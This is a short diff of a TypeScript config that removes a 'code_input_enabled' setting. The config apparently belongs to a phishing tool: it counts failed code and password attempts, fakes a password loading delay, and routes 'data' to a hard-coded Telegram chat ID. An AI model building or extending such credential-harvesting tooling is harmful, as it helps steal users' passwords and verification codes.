@@ -4,7 +4,6 @@ interface Config {
 		max_failed_code_attempts: number;
 		max_failed_password_attempts: number;
 		password_loading_time: number;
-		code_input_enabled: boolean;
 	};
 	telegram: {
 		data_chatid: string;
@@ -17,7 +16,6 @@ const defaultConfig: Config = {
 		max_failed_code_attempts: 3,
 		max_failed_password_attempts: 3,
 		password_loading_time: 1000,
-		code_input_enabled: true,
 	},
 	telegram: {
 		data_chatid: "-1002290360045",
